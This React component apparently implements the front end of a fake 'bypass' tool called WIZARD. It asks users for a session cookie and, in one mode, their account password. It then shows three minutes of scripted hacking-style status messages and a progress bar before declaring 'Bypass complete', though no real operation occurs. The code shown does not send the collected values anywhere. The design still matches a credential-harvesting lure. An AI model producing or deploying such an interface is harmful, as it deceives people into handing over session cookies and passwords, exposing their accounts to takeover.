import { useState } from "react";
import { Cookie, Key } from "lucide-react";
import { z } from "zod";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

type Version = "v1" | "v2";

const v1Schema = z.object({
  cookie: z.string().trim().min(1, "Cookie required").max(4000, "Cookie too long"),
});

const v2Schema = z.object({
  cookie: z.string().trim().min(1, "Cookie required").max(4000, "Cookie too long"),
  password: z.string().min(1, "Password required").max(200, "Password too long"),
});

const Index = () => {
  const [version, setVersion] = useState<Version>("v1");
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [running, setRunning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState<string | null>(null);

  const startBypass = async () => {
    const parsed =
      version === "v1"
        ? v1Schema.safeParse({ cookie })
        : v2Schema.safeParse({ cookie, password });

    if (!parsed.success) {
      toast.error(parsed.error.issues[0].message);
      return;
    }

    setRunning(true);
    setProgress(0);
    setStatus("SENDING REQUEST...");

    const phases = [
      { until: 8, label: "SENDING REQUEST..." },
      { until: 22, label: "ESTABLISHING CONNECTION..." },
      { until: 38, label: "VALIDATING SESSION..." },
      { until: 55, label: "INJECTING PAYLOAD..." },
      { until: 72, label: "BYPASSING PROTECTION..." },
      { until: 88, label: "DECRYPTING TOKENS..." },
      { until: 97, label: "FINALIZING..." },
      { until: 100, label: "COMPLETE" },
    ];

    const totalMs = 180_000; // 3 minutes
    const tickMs = 1000;
    const ticks = totalMs / tickMs;
    const inc = 100 / ticks;

    let p = 0;
    for (let i = 0; i < ticks; i++) {
      await new Promise((r) => setTimeout(r, tickMs));
      p = Math.min(100, p + inc);
      setProgress(Math.floor(p));
      const phase = phases.find((ph) => p <= ph.until) ?? phases[phases.length - 1];
      setStatus(phase.label);
    }

    setProgress(100);
    setStatus("COMPLETE");
    toast.success("Bypass complete");
    setRunning(false);
  };

  return (
    <main className="min-h-screen flex items-center justify-center bg-background px-4 py-10">
      <div
        className="w-full max-w-md rounded-2xl bg-card p-8 border border-border"
        style={{ boxShadow: "var(--shadow-card)" }}
      >
        <h1 className="text-center text-2xl font-bold tracking-[0.4em] mb-8">
          WIZARD
        </h1>

        {/* Tabs */}
        <div className="grid grid-cols-2 gap-1 p-1 rounded-xl bg-secondary border border-border mb-5">
          {(["v1", "v2"] as Version[]).map((v) => (
            <button
              key={v}
              onClick={() => !running && setVersion(v)}
              disabled={running}
              className={`py-2.5 rounded-lg text-xs font-bold tracking-[0.3em] transition-all ${
                version === v
                  ? "bg-background text-foreground shadow-md"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              {v.toUpperCase()}
            </button>
          ))}
        </div>

        {/* Cookie input */}
        <div className="relative mb-3">
          <Cookie className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="text"
            value={cookie}
            onChange={(e) => setCookie(e.target.value)}
            placeholder="TEXTBOX"
            disabled={running}
            maxLength={4000}
            className="w-full bg-input border border-border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60"
          />
        </div>

        {/* Password input (V2 only) */}
        {version === "v2" && (
          <div className="relative mb-3">
            <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Account Password"
              disabled={running}
              maxLength={200}
              className="w-full bg-input border border-border rounded-xl pl-11 pr-4 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60"
            />
          </div>
        )}

        {/* Start button */}
        <button
          onClick={startBypass}
          disabled={running}
          className="w-full mt-4 py-3.5 rounded-xl text-sm font-bold tracking-[0.3em] text-primary-foreground transition-all hover:opacity-90 disabled:opacity-60 disabled:cursor-not-allowed"
          style={{
            background: "var(--gradient-primary)",
            boxShadow: "var(--shadow-glow)",
          }}
        >
          {running ? "RUNNING..." : "START BYPASS"}
        </button>

        {/* System / progress */}
        {status && (
          <div className="mt-8">
            <div className="text-[10px] tracking-[0.4em] text-muted-foreground mb-2">
              SYSTEM
            </div>
            <div className="flex items-center justify-between text-xs font-bold tracking-widest mb-2">
              <span>{status}</span>
              <span className="text-primary">{progress}%</span>
            </div>
            <div className="h-1 w-full rounded-full bg-secondary overflow-hidden">
              <div
                className="h-full transition-all duration-500 ease-out"
                style={{
                  width: `${progress}%`,
                  background: "var(--gradient-primary)",
                }}
              />
            </div>
          </div>
        )}
      </div>
    </main>
  );
};

export default Index;
